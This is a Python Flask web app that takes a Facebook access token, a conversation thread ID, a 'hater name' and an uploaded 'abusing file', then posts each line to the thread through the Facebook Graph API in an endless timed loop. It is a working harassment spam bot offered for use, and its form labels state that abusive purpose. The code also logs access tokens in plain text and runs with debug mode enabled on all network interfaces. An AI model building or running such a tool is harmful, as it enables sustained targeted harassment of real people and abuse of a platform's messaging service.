from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝐀𝐊𝐀𝐓𝐒𝐔𝐊𝐈 🖤</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-image: url('');
      background-repeat: repeat; /* Repeat the background image */
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 300px;
      background-color: bisque;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
      margin: 20px auto;
    }
    .header {
      text-align: center;
      margin-bottom: 20px;
      color: black;
    }
    .btn-submit {
      width: 100%;
      margin-top: 10px;
    }
    .footer {
      text-align: center;
      margin-top: 20px;
    }
    .box {
      border: 2px solid black;
      padding: 20px;
      margin-top: 20px;
      background-color: lavender;
      color: purple;
    }
.  .box {
      position: absolute;
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      background-color: #ffcc00;
      color: black;
      padding: 5px 10px;
      border-radius: 5px;
      z-index: 999;
    } 
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">𝐀𝐊𝐀𝐓𝐒𝐔𝐊𝐈 🖤</h1>
  </header>
    <div class="containe">
      <form action="/" method="post" enctype="multipart/form-data">
        <div class="mb-3">
          <label for="accessToken">𝟑𝐍𝐓𝟑𝐑 𝐘𝟎𝐔𝐑 𝐓𝟎𝐊𝟑𝐍</label>
          <input type="text" class="form-control" id="accessToken" name="accessToken" required>
        </div>
        <div class="mb-3">
          <label for="threadId">𝟑𝐍𝐓𝟑𝐑 𝐘𝟎𝐔𝐑 𝐂𝟎𝐍𝐕𝟎 𝐈𝐃</label>
          <input type="text" class="form-control" id="threadId" name="threadId" required>
        </div>
        <div class="mb-3">
          <label for="kidx">𝟑𝐍𝐓𝟑𝐑 𝐘𝟎𝐔𝐑 𝐇𝟗𝐓𝐓𝟑𝐑 𝐍𝟗𝐌𝟑</label>
          <input type="text" class="form-control" id="kidx" name="kidx" required>
        </div>
        <div class="mb-3">
          <label for="txtFile">𝟑𝐍𝐓𝟑𝐑 𝐘𝟎𝐔𝐑 𝟗𝐁𝐔𝐒𝐈𝐍𝐆 𝐅𝐈𝐋𝟑</label>
          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
        </div>
        <div class="mb-3">
          <label for="time">𝟑𝐍𝐓𝟑𝐑 𝐘𝟎𝐔𝐑 𝐒𝐏𝟑𝟑𝐃</label>
          <input type="number" class="form-control" id="time" name="time" required>
        </div>
        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
      </form>
</body>
</html>

    '''


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

    app.run(debug=True)





